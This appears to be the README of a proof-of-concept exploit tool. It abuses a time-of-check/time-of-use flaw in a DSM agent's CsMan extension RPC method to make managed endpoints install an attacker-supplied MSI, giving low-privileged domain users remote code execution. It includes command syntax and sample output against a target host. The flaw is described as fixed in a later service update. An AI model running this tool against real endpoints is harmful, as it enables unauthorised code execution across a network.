### DSM MSI

----

This project uses the `DSM CsMan extension` RPC interface to request an MSI
upgrade from a running DSM agent. The corresponding RPC method is probably
intended to be used from the management endpoint, to update the DSM version
running on managed clients. Before version `DSM 2022.1.1 Service Update 1`,
the RPC method was vulnerable to a Time of Check, Time of Use (TOCTOU)
vulnerability, that allowed low privileged Active Directory users remote code
execution on any DSM managed endpoint.


### Usage

----

```
C:\>.\dsm-msi.exe
.\dsm-msi.exe <target> <msi-file>

C:\>.\dsm-msi.exe ws291812 \\ws131812\root\DSMClient.msi
[*] RpcStringBindingCompose status code: 0
[*] String binding: ncacn_np:ws291812[\\pipe\\8107ec4c-4c22-42e9-872e-0bd2d534a4a4]
[*] RpcBindingFromStringBinding status code: 0
[*] RpcStringFree status code: 0
[*] RpcBindingSetAuthInfoA status code: 0
[*] Execution finished without an exception.
```
